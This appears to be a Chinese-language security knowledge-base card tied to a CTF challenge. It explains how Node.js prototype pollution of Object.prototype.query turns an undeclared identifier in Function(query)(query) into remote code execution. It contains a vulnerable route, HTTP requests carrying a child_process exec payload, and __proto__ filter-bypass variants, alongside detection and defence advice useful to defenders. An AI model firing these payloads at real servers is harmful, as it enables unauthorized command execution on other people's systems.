---
id: web-nodejs-prototype-pollution-undeclared-identifier-function-rce
title: 原型污染控制未声明标识符，借 Function(query)(query) 执行任意代码
type: scenario
domain: web
path: web/nodejs/prototype-pollution
technique: prototype-pollution-undeclared-global-gadget
tags:
- nodejs
- prototype-pollution
- rce
- javascript
- function-constructor
- v8
- express
- ctF
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:21:54+08:00'
  notes: 已对照原文与 2 张图核对：图01 证实 Object.prototype.test='123' 时 console.log(test) 输出 123；正文 ECMA-262 ResolveBinding/GetIdentifierReference/Global Environment Record HasBinding/HasProperty 与 V8 Scope::Lookup→DeclareDynamicGlobal→LdaLookupGlobalSlot→Context::Lookup→LookupIterator(PROTOTYPE_CHAIN) 的链路与卡片一致；图02 为 contexts.cc 对应源码。Function(query)(query) 与 login.js 污染 Object.prototype.query 的 payload 与原文一致。原文未给出实际 RCE 回显（仅 CTF wp 链路），最终命令执行属基于 JS 语义的完整推论，未在本机执行。原文未涉及版本区间。
url: /docs/web/nodejs/prototype-pollution/web-nodejs-prototype-pollution-undeclared-identifier-function-rce/
draft: false
kb_aliases:
- 未声明变量原型链解析
- Function(query)(query) RCE
- Object.prototype.query
- 标识符解析触发原型污染
- ctfshow web339
---

## 一句话结论

JS 中未声明的标识符在作用域链查找失败后会退化为对全局对象的属性查找，而属性查找会遍历原型链；因此只要应用存在 `Function(query)(query)` 且 `query` 未声明，攻击者通过原型污染写入 `Object.prototype.query` 就能让 `Function()` 执行任意代码，形成 RCE。

## 原理

- **规范层**：标识符解析走 `ResolveBinding` → `GetIdentifierReference`，沿 `[[OuterEnv]]` 一直找到全局环境记录。全局环境记录的 `HasBinding` 先查 `[[DeclarativeRecord]]`（let/const），找不到再查 `[[ObjectRecord]]`，即全局对象；`ObjectRecord.HasBinding` 调用 `HasProperty(bindingObject, N)`，而 `HasProperty` 明确包含原型链遍历。
- 所以 `query` 即使从未声明，也不是“直接 ReferenceError”：引擎先查全局对象自身属性，再沿原型链查找；`Object.prototype.query = "..."` 会让 `query` 这个标识符解析成功，值为污染写入的字符串。
- **V8 实现**：编译期 `Scope::Lookup` 遍历完作用域仍未找到时，用 `DeclareDynamicGlobal` 标记为 `VariableMode::kDynamicGlobal`；字节码生成走 `LoadLookupGlobalSlot` → `LdaLookupGlobalSlot` → `Runtime::kLoadLookupSlot`；运行时 `Context::Lookup` 沿 context 链查找失败后返回全局对象作为 holder，再 `Object::GetProperty`；`LookupIterator` 默认配置 `PROTOTYPE_CHAIN`，完成原型链遍历。
- **利用点**：`res.render('api', { query: Function(query)(query)})` 把 `query` 同时当作函数体和参数。`Function(body)` 在**全局作用域**创建函数，函数体内可直接访问 `global`、`process`；`(query)` 只是调用参数（字符串会被忽略）。于是 `Function(query)` 创建的函数执行 `return global.process.mainModule.constructor._load('child_process').exec(...)`。
- **污染源**：登录等接口对用户 JSON 做不安全递归 merge，`{"__proto__":{"query":"<js>"}}` 会写入 `Object.prototype.query`，从而被上述 gadget 读取。

## 触发条件

- Node.js/Express 应用存在原型污染入口（不安全 merge、`lodash.merge` 旧版本、`JSON.parse` 后递归赋值等）；
- 目标代码使用**未声明标识符**作为 `Function`/`eval` 的代码或参数（如 `Function(query)(query)`、`eval(query)`）；
- 污染键名与代码中的标识符一致（本例为 `query`）；
- 攻击者能触发该路由（本例 `/api`）且污染在同一个 Node 进程内生效（大多数单进程 Express 场景成立）。

## 利用步骤

1. 审计/黑盒发现原型污染入口：登录等接口把用户 JSON 递归合并到对象；测试 `{"__proto__":{"x":"y"}}` 后观察全局对象是否被污染。
2. 定位 gadget：源码中出现未声明变量被传入 `Function`/`eval`（如 `Function(query)(query)`）。
3. 发送污染 payload，把 `query` 设为要执行的 JS 源码：
   `{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('id')"}}`
4. 触发目标路由 `/api`，`Function(query)` 编译并执行该源码，命令结果通过响应/回连获得。
5. 若 `__proto__` 被过滤，改用 `constructor.prototype.query` 或嵌套键（见关联卡）。

## PoC

存在漏洞的路由：

```javascript
router.post('/', require('body-parser').json(), function(req, res, next) {
  res.type('html');
  res.render('api', { query: Function(query)(query)}); // query 未声明
});
```

原型污染请求（`toJSON`/merge 入口）：

```http
POST /login HTTP/1.1
Content-Type: application/json

{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('id')"}}
```

随后访问触发路由：

```http
POST /api HTTP/1.1
Content-Type: application/json

{}
```

`Function(query)` 生成的函数在全局作用域执行 `global.process.mainModule.constructor._load('child_process').exec('id')`，完成命令执行。

最小验证（本地）：

```javascript
Object.prototype.test = "123";
console.log(test); // 输出 123，而不是 ReferenceError
```

## 变体与关联

- 变体：污染键换成代码中其他未声明标识符；gadget 换成 `eval(query)`、`new Function(query)`、模板引擎的动态代码。
- 变体：`__proto__` 被过滤时用 `constructor.prototype`、`constructor[prototype]` 或分段键绕过，参见 [[web-nodejs-prototype-pollution-filter-bypass]]。
- 变体：污染入口可以是 `lodash.merge`、`qs` 解析、表单递归赋值等；参见 [[web-nodejs-prototype-pollution-merge-json-parse]]。
- 关联：[[web-nodejs-prototype-pollution-merge-json-parse]]（污染形成机制与 `__proto__`/JSON.parse 差异）。
- 局限：需要目标进程内存在可用的未声明标识符 gadget；若代码使用严格作用域/`Object.create(null)` 或 `--disable-proto`，该链失效。

## 检测与防御

- 检测：请求体/参数中出现 `__proto__`、`constructor.prototype` 且值为 JavaScript 源码字符串；同一进程内出现全局对象属性被写入后紧接 `Function`/`eval` 调用。
- 检测：源码审计搜索未声明变量传入 `Function`/`eval` 的模式（尤其是 `Function(x)(x)`）；CI 中用 ESLint `no-undef` 捕获。
- 防御：禁止对用户输入做递归 merge；使用 `Object.create(null)`、`Object.freeze(Object.prototype)`、`--disable-proto=throw`、`--disable-proto=delete`；升级 lodash 等库。
- 防御：不要用 `Function`/`eval` 动态执行任何来自请求的数据；必须执行时使用白名单解析器（如 JSON schema + AST 校验）。
- 防御：Node 进程最小权限、禁用不必要的 `child_process`，并部署 RASP/运行时监控 `child_process.exec` 调用。
